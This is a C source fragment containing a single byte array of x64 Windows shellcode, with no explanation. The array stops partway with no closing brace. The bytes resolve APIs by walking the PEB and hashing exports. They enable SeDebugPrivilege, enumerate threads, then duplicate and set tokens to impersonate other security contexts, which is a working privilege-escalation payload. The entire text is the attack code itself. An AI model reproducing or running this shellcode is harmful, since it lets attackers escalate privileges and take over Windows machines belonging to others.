unsigned char shellcode_bin[] = {
  0x57, 0x48, 0x89, 0xe7, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x83, 0xec, 0x20,
  0xe8, 0xef, 0x03, 0x00, 0x00, 0x48, 0x89, 0xfc, 0x5f, 0xc3, 0x66, 0x2e,
  0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04,
  0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x58, 0x48, 0x8b,
  0x40, 0x18, 0x4c, 0x8b, 0x50, 0x20, 0x4c, 0x8d, 0x58, 0x20, 0x4d, 0x39,
  0xd3, 0x74, 0x47, 0x90, 0x49, 0x8b, 0x42, 0x50, 0x41, 0xb8, 0xff, 0x1f,
  0x00, 0x00, 0x4c, 0x8d, 0x48, 0x02, 0x0f, 0xb7, 0x00, 0x66, 0x85, 0xc0,
  0x74, 0x23, 0x66, 0x2e, 0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x44, 0x89, 0xc2, 0x49, 0x83, 0xc1, 0x02, 0xc1, 0xe2, 0x05, 0x01, 0xd0,
  0x41, 0x01, 0xc0, 0x41, 0x0f, 0xb7, 0x41, 0xfe, 0x66, 0x85, 0xc0, 0x75,
  0xe7, 0x44, 0x39, 0xc1, 0x74, 0x0b, 0x4d, 0x8b, 0x12, 0x4d, 0x39, 0xd3,
  0x75, 0xba, 0x31, 0xc0, 0xc3, 0x49, 0x8b, 0x42, 0x20, 0xc3, 0x90, 0x90,
  0x48, 0x63, 0x41, 0x3c, 0x55, 0x57, 0x56, 0x89, 0xd6, 0x53, 0x8b, 0x84,
  0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x01, 0xc8, 0x8b, 0x50, 0x20, 0x8b,
  0x58, 0x1c, 0x44, 0x8b, 0x58, 0x24, 0x8b, 0x40, 0x14, 0x48, 0x01, 0xca,
  0x48, 0x01, 0xcb, 0x49, 0x01, 0xcb, 0x85, 0xc0, 0x74, 0x5f, 0x83, 0xe8,
  0x01, 0x49, 0x8d, 0x7c, 0x43, 0x02, 0x66, 0x2e, 0x0f, 0x1f, 0x84, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x8b, 0x02, 0x45, 0x0f, 0xb7, 0x03, 0x41, 0xb9,
  0xff, 0x1f, 0x00, 0x00, 0x48, 0x01, 0xc8, 0x42, 0x8b, 0x2c, 0x83, 0x4c,
  0x8d, 0x50, 0x01, 0x0f, 0xbe, 0x00, 0x84, 0xc0, 0x74, 0x1d, 0x66, 0x90,
  0x45, 0x89, 0xc8, 0x41, 0xc1, 0xe0, 0x05, 0x44, 0x01, 0xc0, 0x41, 0x01,
  0xc1, 0x4c, 0x89, 0xd0, 0x49, 0x83, 0xc2, 0x01, 0x0f, 0xbe, 0x00, 0x84,
  0xc0, 0x75, 0xe5, 0x44, 0x39, 0xce, 0x74, 0x14, 0x49, 0x83, 0xc3, 0x02,
  0x48, 0x83, 0xc2, 0x04, 0x4c, 0x39, 0xdf, 0x75, 0xb3, 0x5b, 0x31, 0xc0,
  0x5e, 0x5f, 0x5d, 0xc3, 0x89, 0xe8, 0x5b, 0x5e, 0x48, 0x01, 0xc8, 0x5f,
  0x5d, 0xc3, 0x90, 0x90, 0x53, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x60, 0x00,
  0x00, 0x00, 0x48, 0x8b, 0x40, 0x18, 0x4c, 0x8b, 0x58, 0x20, 0x48, 0x8d,
  0x58, 0x20, 0x4c, 0x39, 0xdb, 0x74, 0x4d, 0x0f, 0x1f, 0x44, 0x00, 0x00,
  0x49, 0x8b, 0x53, 0x50, 0x49, 0x89, 0xc8, 0x0f, 0xb7, 0x02, 0x66, 0x85,
  0xc0, 0x75, 0x1a, 0xeb, 0x3f, 0x0f, 0x1f, 0x80, 0x00, 0x00, 0x00, 0x00,
  0x0f, 0xb7, 0x42, 0x02, 0x48, 0x83, 0xc2, 0x02, 0x49, 0x83, 0xc0, 0x02,
  0x66, 0x85, 0xc0, 0x74, 0x27, 0x44, 0x8d, 0x50, 0xbf, 0x44, 0x8d, 0x48,
  0x20, 0x66, 0x41, 0x83, 0xfa, 0x1a, 0x41, 0x0f, 0x42, 0xc1, 0x66, 0x41,
  0x39, 0x00, 0x74, 0xd8, 0x4d, 0x8b, 0x1b, 0x4c, 0x39, 0xdb, 0x75, 0xb8,
  0x31, 0xc0, 0x5b, 0xc3, 0x0f, 0x1f, 0x40, 0x00, 0x66, 0x41, 0x83, 0x38,
  0x00, 0x75, 0xe9, 0x49, 0x8b, 0x43, 0x20, 0x5b, 0xc3, 0x90, 0x90, 0x90,
  0x48, 0x63, 0x41, 0x3c, 0x41, 0x54, 0x55, 0x57, 0x56, 0x48, 0x89, 0xd6,
  0x53, 0x8b, 0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x01, 0xc8, 0x8b,
  0x50, 0x20, 0x8b, 0x78, 0x1c, 0x44, 0x8b, 0x58, 0x24, 0x8b, 0x40, 0x14,
  0x48, 0x01, 0xca, 0x48, 0x01, 0xcf, 0x49, 0x01, 0xcb, 0x85, 0xc0, 0x74,
  0x62, 0x83, 0xe8, 0x01, 0x0f, 0xb6, 0x1e, 0x4d, 0x8d, 0x64, 0x43, 0x02,
  0x0f, 0x1f, 0x40, 0x00, 0x8b, 0x02, 0x45, 0x0f, 0xb7, 0x03, 0x49, 0x89,
  0xf2, 0x41, 0x89, 0xd9, 0x48, 0x01, 0xc8, 0x42, 0x8b, 0x2c, 0x87, 0x44,
  0x0f, 0xb6, 0x00, 0x49, 0x29, 0xc2, 0x44, 0x38, 0xc3, 0x74, 0x1d, 0xeb,
  0x25, 0x0f, 0x1f, 0x80, 0x00, 0x00, 0x00, 0x00, 0x44, 0x0f, 0xb6, 0x40,
  0x01, 0x46, 0x0f, 0xb6, 0x4c, 0x10, 0x01, 0x48, 0x83, 0xc0, 0x01, 0x45,
  0x38, 0xc8, 0x75, 0x0a, 0x45, 0x84, 0xc0, 0x75, 0xe7, 0x45, 0x84, 0xc9,
  0x74, 0x16, 0x49, 0x83, 0xc3, 0x02, 0x48, 0x83, 0xc2, 0x04, 0x4d, 0x39,
  0xdc, 0x75, 0xad, 0x5b, 0x31, 0xc0, 0x5e, 0x5f, 0x5d, 0x41, 0x5c, 0xc3,
  0x89, 0xe8, 0x5b, 0x5e, 0x48, 0x01, 0xc8, 0x5f, 0x5d, 0x41, 0x5c, 0xc3,
  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x44, 0x0f, 0xb6, 0x02,
  0x44, 0x0f, 0xb6, 0x09, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x45, 0x38, 0xc1,
  0x74, 0x1a, 0xeb, 0x1d, 0x0f, 0x1f, 0x40, 0x00, 0x44, 0x0f, 0xb6, 0x04,
  0x02, 0x48, 0x83, 0xc0, 0x01, 0x44, 0x0f, 0xb6, 0x4c, 0x01, 0xff, 0x45,
  0x38, 0xc8, 0x75, 0x05, 0x45, 0x84, 0xc0, 0x75, 0xe7, 0x31, 0xc0, 0x45,
  0x38, 0xc8, 0x0f, 0x94, 0xc0, 0xc3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
  0xeb, 0x24, 0x66, 0x0f, 0x1f, 0x44, 0x00, 0x00, 0x44, 0x8d, 0x48, 0xbf,
  0x44, 0x8d, 0x40, 0x20, 0x66, 0x41, 0x83, 0xf9, 0x1a, 0x41, 0x0f, 0x42,
  0xc0, 0x66, 0x39, 0x01, 0x75, 0x22, 0x48, 0x83, 0xc1, 0x02, 0x48, 0x83,
  0xc2, 0x02, 0x0f, 0xb7, 0x02, 0x66, 0x85, 0xc0, 0x75, 0xda, 0x31, 0xc0,
  0x66, 0x83, 0x39, 0x00, 0x0f, 0x94, 0xc0, 0xc3, 0x0f, 0x1f, 0x84, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x31, 0xc0, 0xc3, 0x90, 0x90, 0x90, 0x90, 0x90,
  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x0f, 0xbe, 0x01, 0x4c,
  0x8d, 0x49, 0x01, 0x41, 0xb8, 0xff, 0x1f, 0x00, 0x00, 0x84, 0xc0, 0x74,
  0x1f, 0x0f, 0x1f, 0x80, 0x00, 0x00, 0x00, 0x00, 0x44, 0x89, 0xc2, 0x49,
  0x83, 0xc1, 0x01, 0xc1, 0xe2, 0x05, 0x01, 0xd0, 0x41, 0x01, 0xc0, 0x41,
  0x0f, 0xbe, 0x41, 0xff, 0x84, 0xc0, 0x75, 0xe8, 0x44, 0x89, 0xc0, 0xc3,
  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
  0x0f, 0xb7, 0x01, 0x4c, 0x8d, 0x49, 0x02, 0x41, 0xb8, 0xff, 0x1f, 0x00,
  0x00, 0x66, 0x85, 0xc0, 0x74, 0x1f, 0x66, 0x0f, 0x1f, 0x44, 0x00, 0x00,
  0x44, 0x89, 0xc2, 0x49, 0x83, 0xc1, 0x02, 0xc1, 0xe2, 0x05, 0x01, 0xd0,
  0x41, 0x01, 0xc0, 0x41, 0x0f, 0xb7, 0x41, 0xfe, 0x66, 0x85, 0xc0, 0x75,
  0xe7, 0x44, 0x89, 0xc0, 0xc3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
  0x90, 0x90, 0x90, 0x90, 0x55, 0x48, 0x89, 0xd5, 0x57, 0x4c, 0x89, 0xc7,
  0x56, 0x48, 0x89, 0xce, 0x53, 0x31, 0xdb, 0x48, 0x83, 0xec, 0x28, 0xeb,
  0x14, 0x0f, 0x1f, 0x00, 0x0f, 0xb6, 0x14, 0x1f, 0x48, 0x8b, 0x06, 0x48,
  0x83, 0xc3, 0x01, 0x88, 0x10, 0x48, 0x83, 0x06, 0x01, 0x48, 0x89, 0xf9,
  0xff, 0xd5, 0x48, 0x39, 0xd8, 0x77, 0xe5, 0x48, 0x83, 0xc4, 0x28, 0x5b,
  0x5e, 0x5f, 0x5d, 0xc3, 0x90, 0x90, 0x90, 0x90, 0x55, 0x48, 0x89, 0xd5,
  0x57, 0x4c, 0x89, 0xc7, 0x56, 0x48, 0x89, 0xce, 0x53, 0x31, 0xdb, 0x48,
  0x83, 0xec, 0x28, 0xeb, 0x11, 0x0f, 0x1f, 0x00, 0x0f, 0xb6, 0x14, 0x1f,
  0x48, 0x83, 0xc3, 0x01, 0x88, 0x10, 0x48, 0x83, 0x06, 0x01, 0x48, 0x89,
  0xf9, 0xff, 0xd5, 0x48, 0x39, 0xd8, 0x48, 0x8b, 0x06, 0x77, 0xe5, 0xc6,
  0x00, 0x0a, 0x48, 0x83, 0x06, 0x01, 0x48, 0x83, 0xc4, 0x28, 0x5b, 0x5e,
  0x5f, 0x5d, 0xc3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
  0x90, 0x90, 0x90, 0x90, 0x55, 0x48, 0x89, 0xe5, 0x41, 0x57, 0x41, 0x56,
  0x41, 0x55, 0x41, 0x54, 0x57, 0x56, 0x53, 0x48, 0x89, 0xcb, 0xb9, 0x4f,
  0xe7, 0x09, 0xa7, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x81, 0xec, 0x90, 0x02,
  0x00, 0x00, 0xe8, 0xf9, 0xfb, 0xff, 0xff, 0x49, 0x89, 0xc6, 0x48, 0x85,
  0xc0, 0x0f, 0x84, 0x55, 0x07, 0x00, 0x00, 0x48, 0x8d, 0x94, 0x24, 0xd0,
  0x00, 0x00, 0x00, 0x4c, 0x89, 0xf1, 0x48, 0xb8, 0x4c, 0x6f, 0x61, 0x64,
  0x4c, 0x69, 0x62, 0x72, 0xc7, 0x84, 0x24, 0xd8, 0x00, 0x00, 0x00, 0x61,
  0x72, 0x79, 0x41, 0x48, 0x89, 0x84, 0x24, 0xd0, 0x00, 0x00, 0x00, 0xc6,
  0x84, 0x24, 0xdc, 0x00, 0x00, 0x00, 0x00, 0xe8, 0x48, 0xfd, 0xff, 0xff,
  0xb9, 0x6c, 0x6c, 0x00, 0x00, 0xc6, 0x84, 0x24, 0xac, 0x00, 0x00, 0x00,
  0x00, 0x48, 0x89, 0xc7, 0x66, 0x89, 0x8c, 0x24, 0xaa, 0x00, 0x00, 0x00,
  0x48, 0xb8, 0x6d, 0x73, 0x76, 0x63, 0x72, 0x74, 0x2e, 0x64, 0x48, 0x8d,
  0x8c, 0x24, 0xa2, 0x00, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0xa2, 0x00,
  0x00, 0x00, 0xff, 0xd7, 0x41, 0xb8, 0x65, 0x6e, 0x00, 0x00, 0x48, 0x8d,
  0x54, 0x24, 0x72, 0xc7, 0x44, 0x24, 0x72, 0x73, 0x74, 0x72, 0x6c, 0x48,
  0x89, 0xc1, 0x66, 0x44, 0x89, 0x44, 0x24, 0x76, 0xc6, 0x44, 0x24, 0x78,
  0x00, 0x48, 0x89, 0x44, 0x24, 0x48, 0xe8, 0xe9, 0xfc, 0xff, 0xff, 0x48,
  0x8d, 0x8c, 0x24, 0xdd, 0x00, 0x00, 0x00, 0xc7, 0x84, 0x24, 0xe5, 0x00,
  0x00, 0x00, 0x2e, 0x64, 0x6c, 0x6c, 0x48, 0x89, 0xc6, 0xc6, 0x84, 0x24,
  0xe9, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8, 0x61, 0x64, 0x76, 0x61, 0x70,
  0x69, 0x33, 0x32, 0x48, 0x89, 0x84, 0x24, 0xdd, 0x00, 0x00, 0x00, 0xff,
  0xd7, 0x4c, 0x89, 0xf1, 0x48, 0x8d, 0x94, 0x24, 0xb8, 0x00, 0x00, 0x00,
  0xc7, 0x84, 0x24, 0xc0, 0x00, 0x00, 0x00, 0x65, 0x73, 0x73, 0x00, 0x49,
  0x89, 0xc4, 0x48, 0xb8, 0x4f, 0x70, 0x65, 0x6e, 0x50, 0x72, 0x6f, 0x63,
  0x48, 0x89, 0x84, 0x24, 0xb8, 0x00, 0x00, 0x00, 0xe8, 0x87, 0xfc, 0xff,
  0xff, 0x41, 0xb9, 0x73, 0x00, 0x00, 0x00, 0x48, 0xba, 0x6e, 0x74, 0x50,
  0x72, 0x6f, 0x63, 0x65, 0x73, 0x48, 0x89, 0x44, 0x24, 0x58, 0x48, 0xb8,
  0x47, 0x65, 0x74, 0x43, 0x75, 0x72, 0x72, 0x65, 0x48, 0x89, 0x94, 0x24,
  0x88, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x94, 0x24, 0x80, 0x01, 0x00, 0x00,
  0x66, 0x44, 0x89, 0x8c, 0x24, 0x90, 0x01, 0x00, 0x00, 0x48, 0x89, 0x84,
  0x24, 0x80, 0x01, 0x00, 0x00, 0xe8, 0x42, 0xfc, 0xff, 0xff, 0xc6, 0x84,
  0x24, 0x50, 0x01, 0x00, 0x00, 0x00, 0x48, 0xba, 0x4f, 0x70, 0x65, 0x6e,
  0x50, 0x72, 0x6f, 0x63, 0x48, 0xb9, 0x65, 0x73, 0x73, 0x54, 0x6f, 0x6b,
  0x65, 0x6e, 0x48, 0x89, 0x94, 0x24, 0x40, 0x01, 0x00, 0x00, 0x48, 0x8d,
  0x94, 0x24, 0x40, 0x01, 0x00, 0x00, 0x49, 0x89, 0xc5, 0x48, 0x89, 0x8c,
  0x24, 0x48, 0x01, 0x00, 0x00, 0x4c, 0x89, 0xe1, 0xe8, 0x03, 0xfc, 0xff,
  0xff, 0x41, 0xba, 0x41, 0x00, 0x00, 0x00, 0x48, 0xba, 0x4c, 0x6f, 0x6f,
  0x6b, 0x75, 0x70, 0x50, 0x72, 0x48, 0xb9, 0x69, 0x76, 0x69, 0x6c, 0x65,
  0x67, 0x65, 0x56, 0x48, 0x89, 0x94, 0x24, 0xc0, 0x01, 0x00, 0x00, 0x48,
  0x8d, 0x94, 0x24, 0xc0, 0x01, 0x00, 0x00, 0x48, 0x89, 0xc7, 0x48, 0x89,
  0x8c, 0x24, 0xc8, 0x01, 0x00, 0x00, 0x4c, 0x89, 0xe1, 0x66, 0x44, 0x89,
  0x94, 0x24, 0xd4, 0x01, 0x00, 0x00, 0xc7, 0x84, 0x24, 0xd0, 0x01, 0x00,
  0x00, 0x61, 0x6c, 0x75, 0x65, 0xe8, 0xb2, 0xfb, 0xff, 0xff, 0x41, 0xbb,
  0x73, 0x00, 0x00, 0x00, 0x48, 0xba, 0x41, 0x64, 0x6a, 0x75, 0x73, 0x74,
  0x54, 0x6f, 0x48, 0xb9, 0x6b, 0x65, 0x6e, 0x50, 0x72, 0x69, 0x76, 0x69,
  0x48, 0x89, 0x94, 0x24, 0xe0, 0x01, 0x00, 0x00, 0x49, 0x89, 0xc7, 0x48,
  0x8d, 0x94, 0x24, 0xe0, 0x01, 0x00, 0x00, 0x48, 0x89, 0x8c, 0x24, 0xe8,
  0x01, 0x00, 0x00, 0x4c, 0x89, 0xe1, 0x66, 0x44, 0x89, 0x9c, 0x24, 0xf4,
  0x01, 0x00, 0x00, 0xc7, 0x84, 0x24, 0xf0, 0x01, 0x00, 0x00, 0x6c, 0x65,
  0x67, 0x65, 0xe8, 0x61, 0xfb, 0xff, 0xff, 0x48, 0x8d, 0x94, 0x24, 0x12,
  0x01, 0x00, 0x00, 0x48, 0xb9, 0x44, 0x75, 0x70, 0x6c, 0x69, 0x63, 0x61,
  0x74, 0xc7, 0x84, 0x24, 0x1a, 0x01, 0x00, 0x00, 0x65, 0x54, 0x6f, 0x6b,
  0x48, 0x89, 0x44, 0x24, 0x50, 0xb8, 0x65, 0x6e, 0x00, 0x00, 0x48, 0x89,
  0x8c, 0x24, 0x12, 0x01, 0x00, 0x00, 0x4c, 0x89, 0xe1, 0x66, 0x89, 0x84,
  0x24, 0x1e, 0x01, 0x00, 0x00, 0xc6, 0x84, 0x24, 0x20, 0x01, 0x00, 0x00,
  0x00, 0xe8, 0x1a, 0xfb, 0xff, 0xff, 0x48, 0x8d, 0x94, 0x24, 0x21, 0x01,
  0x00, 0x00, 0x48, 0xb9, 0x53, 0x65, 0x74, 0x54, 0x68, 0x72, 0x65, 0x61,
  0xc7, 0x84, 0x24, 0x29, 0x01, 0x00, 0x00, 0x64, 0x54, 0x6f, 0x6b, 0x48,
  0x89, 0x44, 0x24, 0x40, 0xb8, 0x65, 0x6e, 0x00, 0x00, 0x48, 0x89, 0x8c,
  0x24, 0x21, 0x01, 0x00, 0x00, 0x4c, 0x89, 0xe1, 0x66, 0x89, 0x84, 0x24,
  0x2d, 0x01, 0x00, 0x00, 0xc6, 0x84, 0x24, 0x2f, 0x01, 0x00, 0x00, 0x00,
  0xe8, 0xd3, 0xfa, 0xff, 0xff, 0x48, 0x8d, 0x94, 0x24, 0x04, 0x01, 0x00,
  0x00, 0x4c, 0x89, 0xf1, 0x49, 0xbb, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64,
  0x33, 0x32, 0x48, 0x89, 0x44, 0x24, 0x38, 0xb8, 0x74, 0x00, 0x00, 0x00,
  0x4c, 0x89, 0x9c, 0x24, 0x04, 0x01, 0x00, 0x00, 0xc7, 0x84, 0x24, 0x0c,
  0x01, 0x00, 0x00, 0x46, 0x69, 0x72, 0x73, 0x66, 0x89, 0x84, 0x24, 0x10,
  0x01, 0x00, 0x00, 0xe8, 0x94, 0xfa, 0xff, 0xff, 0xc6, 0x84, 0x24, 0x18,
  0x02, 0x00, 0x00, 0x00, 0x48, 0xb9, 0x6f, 0x6c, 0x68, 0x65, 0x6c, 0x70,
  0x33, 0x32, 0x48, 0xba, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x54, 0x6f,
  0x48, 0x89, 0x8c, 0x24, 0x08, 0x02, 0x00, 0x00, 0x48, 0xb9, 0x53, 0x6e,
  0x61, 0x70, 0x73, 0x68, 0x6f, 0x74, 0x48, 0x89, 0x94, 0x24, 0x00, 0x02,
  0x00, 0x00, 0x48, 0x8d, 0x94, 0x24, 0x00, 0x02, 0x00, 0x00, 0x48, 0x89,
  0x8c, 0x24, 0x10, 0x02, 0x00, 0x00, 0x4c, 0x89, 0xf1, 0xe8, 0x46, 0xfa,
  0xff, 0xff, 0x48, 0x8d, 0x94, 0x24, 0xea, 0x00, 0x00, 0x00, 0x49, 0xbb,
  0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x33, 0x32, 0xc7, 0x84, 0x24, 0xf2,
  0x00, 0x00, 0x00, 0x4e, 0x65, 0x78, 0x74, 0x4c, 0x89, 0x9c, 0x24, 0xea,
  0x00, 0x00, 0x00, 0xc6, 0x84, 0x24, 0xf6, 0x00, 0x00, 0x00, 0x00, 0xe8,
  0x14, 0xfa, 0xff, 0xff, 0x4c, 0x8b, 0x4c, 0x24, 0x48, 0xb8, 0x74, 0x66,
  0x00, 0x00, 0x48, 0x8d, 0x54, 0x24, 0x79, 0xc7, 0x44, 0x24, 0x79, 0x70,
  0x72, 0x69, 0x6e, 0x4c, 0x89, 0xc9, 0x66, 0x89, 0x44, 0x24, 0x7d, 0xc6,
  0x44, 0x24, 0x7f, 0x00, 0xe8, 0xeb, 0xf9, 0xff, 0xff, 0x48, 0x8d, 0x94,
  0x24, 0xc4, 0x00, 0x00, 0x00, 0x48, 0xb9, 0x43, 0x6c, 0x6f, 0x73, 0x65,
  0x48, 0x61, 0x6e, 0xc7, 0x84, 0x24, 0xcc, 0x00, 0x00, 0x00, 0x64, 0x6c,
  0x65, 0x00, 0x48, 0x89, 0x8c, 0x24, 0xc4, 0x00, 0x00, 0x00, 0x4c, 0x89,
  0xf1, 0xe8, 0xbe, 0xf9, 0xff, 0xff, 0x48, 0xba, 0x6e, 0x74, 0x50, 0x72,
  0x6f, 0x63, 0x65, 0x73, 0x48, 0xb8, 0x47, 0x65, 0x74, 0x43, 0x75, 0x72,
  0x72, 0x65, 0xc7, 0x84, 0x24, 0xb0, 0x01, 0x00, 0x00, 0x73, 0x49, 0x64,
  0x00, 0x48, 0x89, 0x94, 0x24, 0xa8, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x94,
  0x24, 0xa0, 0x01, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0xa0, 0x01, 0x00,
  0x00, 0xe8, 0x82, 0xf9, 0xff, 0xff, 0x48, 0x8d, 0x94, 0x24, 0xad, 0x00,
  0x00, 0x00, 0x48, 0xb8, 0x4f, 0x70, 0x65, 0x6e, 0x54, 0x68, 0x72, 0x65,
  0xc6, 0x84, 0x24, 0xb7, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24,
  0xad, 0x00, 0x00, 0x00, 0xb8, 0x61, 0x64, 0x00, 0x00, 0x66, 0x89, 0x84,
  0x24, 0xb5, 0x00, 0x00, 0x00, 0xe8, 0x4e, 0xf9, 0xff, 0xff, 0xba, 0x70,
  0x00, 0x00, 0x00, 0xc7, 0x44, 0x24, 0x6c, 0x53, 0x6c, 0x65, 0x65, 0x66,
  0x89, 0x54, 0x24, 0x70, 0x48, 0x8d, 0x54, 0x24, 0x6c, 0xe8, 0x32, 0xf9,
  0xff, 0xff, 0x41, 0xff, 0xd5, 0x4c, 0x8d, 0x84, 0x24, 0x80, 0x00, 0x00,
  0x00, 0xba, 0x20, 0x00, 0x00, 0x00, 0x4c, 0x8d, 0xac, 0x24, 0x20, 0x02,
  0x00, 0x00, 0x48, 0x89, 0xc1, 0xff, 0xd7, 0x85, 0xc0, 0x75, 0x78, 0x48,
  0xb8, 0x65, 0x72, 0x72, 0x6f, 0x72, 0x4f, 0x70, 0x65, 0x45, 0x31, 0xf6,
  0x48, 0xba, 0x6e, 0x69, 0x6e, 0x67, 0x43, 0x75, 0x72, 0x72, 0x48, 0x89,
  0x84, 0x24, 0x20, 0x02, 0x00, 0x00, 0x48, 0xb8, 0x65, 0x6e, 0x74, 0x50,
  0x72, 0x6f, 0x63, 0x65, 0x48, 0x89, 0x94, 0x24, 0x28, 0x02, 0x00, 0x00,
  0x48, 0xba, 0x73, 0x73, 0x54, 0x6f, 0x6b, 0x65, 0x6e, 0x00, 0x48, 0x89,
  0x84, 0x24, 0x30, 0x02, 0x00, 0x00, 0x48, 0x89, 0x94, 0x24, 0x38, 0x02,
  0x00, 0x00, 0xeb, 0x14, 0x0f, 0x1f, 0x40, 0x00, 0x43, 0x0f, 0xb6, 0x4c,
  0x35, 0x00, 0x48, 0x89, 0xc3, 0x49, 0x83, 0xc6, 0x01, 0x88, 0x48, 0xff,
  0x4c, 0x89, 0xe9, 0xff, 0xd6, 0x49, 0x89, 0xc0, 0x48, 0x8d, 0x43, 0x01,
  0x4d, 0x39, 0xf0, 0x77, 0xdf, 0xc6, 0x03, 0x0a, 0x48, 0x89, 0xc3, 0x48,
  0xba, 0x72, 0x69, 0x76, 0x69, 0x6c, 0x65, 0x67, 0x65, 0x31, 0xc9, 0x48,
  0xb8, 0x53, 0x65, 0x44, 0x65, 0x62, 0x75, 0x67, 0x50, 0xc6, 0x84, 0x24,
  0x70, 0x01, 0x00, 0x00, 0x00, 0x48, 0x89, 0x94, 0x24, 0x68, 0x01, 0x00,
  0x00, 0x4c, 0x8d, 0x84, 0x24, 0x98, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x94,
  0x24, 0x60, 0x01, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x60, 0x01, 0x00,
  0x00, 0x41, 0xff, 0xd7, 0x85, 0xc0, 0x75, 0x6b, 0x48, 0xba, 0x6e, 0x64,
  0x69, 0x6e, 0x67, 0x20, 0x53, 0x65, 0x45, 0x31, 0xff, 0x48, 0xb8, 0x45,
  0x72, 0x72, 0x6f, 0x72, 0x20, 0x66, 0x69, 0xc7, 0x84, 0x24, 0x30, 0x02,
  0x00, 0x00, 0x44, 0x65, 0x62, 0x75, 0x48, 0x89, 0x94, 0x24, 0x28, 0x02,
  0x00, 0x00, 0xba, 0x67, 0x00, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x20,
  0x02, 0x00, 0x00, 0x66, 0x89, 0x94, 0x24, 0x34, 0x02, 0x00, 0x00, 0xeb,
  0x13, 0x0f, 0x1f, 0x00, 0x43, 0x0f, 0xb6, 0x54, 0x3d, 0x00, 0x48, 0x89,
  0xc3, 0x49, 0x83, 0xc7, 0x01, 0x88, 0x50, 0xff, 0x4c, 0x89, 0xe9, 0xff,
  0xd6, 0x49, 0x89, 0xc0, 0x48, 0x8d, 0x43, 0x01, 0x4d, 0x39, 0xf8, 0x77,
  0xdf, 0xc6, 0x03, 0x0a, 0x48, 0x89, 0xc3, 0x48, 0x8b, 0x84, 0x24, 0x98,
  0x00, 0x00, 0x00, 0x31, 0xd2, 0xc7, 0x84, 0x24, 0x30, 0x01, 0x00, 0x00,
  0x01, 0x00, 0x00, 0x00, 0x41, 0xb9, 0x10, 0x00, 0x00, 0x00, 0x48, 0x8b,
  0x8c, 0x24, 0x80, 0x00, 0x00, 0x00, 0x4c, 0x8d, 0x84, 0x24, 0x30, 0x01,
  0x00, 0x00, 0xc7, 0x84, 0x24, 0x3c, 0x01, 0x00, 0x00, 0x02, 0x00, 0x00,
  0x00, 0x48, 0x89, 0x84, 0x24, 0x34, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x44,
  0x24, 0x50, 0x48, 0xc7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00, 0x48,
  0xc7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd0, 0x85, 0xc0,
  0x0f, 0x84, 0xea, 0x00, 0x00, 0x00, 0xb9, 0x00, 0x04, 0x00, 0x00, 0x48,
  0x8b, 0x44, 0x24, 0x58, 0x41, 0xb8, 0xe0, 0x05, 0x00, 0x00, 0xba, 0x01,
  0x00, 0x00, 0x00, 0xff, 0xd0, 0x48, 0x89, 0xc1, 0x48, 0x85, 0xc0, 0x0f,
  0x84, 0xff, 0x01, 0x00, 0x00, 0x4c, 0x8d, 0x84, 0x24, 0x88, 0x00, 0x00,
  0x00, 0xba, 0x06, 0x00, 0x00, 0x00, 0xff, 0xd7, 0x48, 0x8b, 0x8c, 0x24,
  0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc9, 0x0f, 0x84, 0x57, 0x01, 0x00,
  0x00, 0x4c, 0x8d, 0x84, 0x24, 0x90, 0x00, 0x00, 0x00, 0xba, 0x02, 0x00,
  0x00, 0x00, 0x48, 0x8b, 0x44, 0x24, 0x40, 0x31, 0xff, 0xff, 0xd0, 0x48,
  0x8b, 0x94, 0x24, 0x90, 0x00, 0x00, 0x00, 0x31, 0xc9, 0x48, 0x8b, 0x44,
  0x24, 0x38, 0xff, 0xd0, 0x48, 0x8d, 0x94, 0x24, 0xf7, 0x00, 0x00, 0x00,
  0x4c, 0x89, 0xe1, 0x48, 0xb8, 0x47, 0x65, 0x74, 0x55, 0x73, 0x65, 0x72,
  0x4e, 0x48, 0x89, 0x84, 0x24, 0xf7, 0x00, 0x00, 0x00, 0xc7, 0x84, 0x24,
  0xff, 0x00, 0x00, 0x00, 0x61, 0x6d, 0x65, 0x41, 0xc6, 0x84, 0x24, 0x03,
  0x01, 0x00, 0x00, 0x00, 0xe8, 0xeb, 0xf6, 0xff, 0xff, 0xc7, 0x44, 0x24,
  0x68, 0x64, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x54, 0x24, 0x68, 0x4c, 0x89,
  0xe9, 0xff, 0xd0, 0xeb, 0x18, 0x0f, 0x1f, 0x80, 0x00, 0x00, 0x00, 0x00,
